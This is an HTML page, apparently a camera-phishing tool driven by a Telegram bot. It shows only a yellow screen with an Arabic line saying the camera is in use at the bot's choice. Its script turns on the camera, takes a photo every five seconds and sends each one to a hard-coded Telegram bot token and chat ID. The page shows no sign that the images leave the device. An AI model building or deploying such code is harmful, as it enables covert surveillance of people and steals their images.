<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Camera Capture</title>
  <style>
    body {
      background-color: yellow;
      margin: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      flex-direction: column;
      font-family: 'Cairo', sans-serif;
    }

    .container {
      text-align: center;
    }

    video {
      width: 200px;
      height: auto;
      border: 2px solid #333;
      border-radius: 10px;
      margin-top: 20px;
    }

    img {
      max-width: 100%;
      height: auto;
      border-radius: 10px;
      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
    }

    .description {
      margin-top: 20px;
      font-size: 1.5em;
      font-weight: bold;
      color: #333;
    }
  </style>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600&display=swap" rel="stylesheet">
</head>
<body>
  <div class="container">
    <video id="video" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>
    <div class="description">
      الكاميرا الآن قيد الاستخدام بناءً على اختيارك من البوت.
    </div>
  </div>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    let stream;

    // Start camera with specified mode
    async function startCamera(mode) {
      try {
        if (stream) {
          const tracks = stream.getTracks();
          tracks.forEach(track => track.stop());
        }

        stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: mode }
        });

        video.srcObject = stream;
        captureAndSend(); // Start capturing images and sending automatically
      } catch (error) {
        console.error("Error accessing camera: ", error);
      }
    }

    // Capture and send image every 5 seconds
    async function captureAndSend() {
      const context = canvas.getContext('2d');
      setInterval(async () => {
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0, canvas.width, canvas.height);

        const imageData = canvas.toDataURL('image/png'); // Convert image to Base64
        sendToTelegram(imageData); // Send the image to Telegram
      }, 5000); // Send image every 5 seconds
    }

    // Send image to Telegram
    async function sendToTelegram(imageData) {
      const token = '8165540566:AAGXlo_1ljb6IkAG8jj7BjZdxwfJQhub96o'; // Bot token
      const chatId = '6514749116'; // Chat ID

      const blob = await fetch(imageData).then(res => res.blob());
      const formData = new FormData();
      formData.append('chat_id', chatId);
      formData.append('photo', blob, 'photo.png');

      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: 'POST',
        body: formData
      })
      .then(response => response.json())
      .then(result => {
        console.log('Photo sent successfully:', result);
      })
      .catch(error => {
        console.error('Error sending photo:', error);
      });
    }

    // Automatically start camera based on mode received from bot
    const urlParams = new URLSearchParams(window.location.search);
    const cameraMode = urlParams.get('mode'); // Get 'mode' parameter from URL
    if (cameraMode) {
      startCamera(cameraMode);
    }
  </script>
</body>
</html>
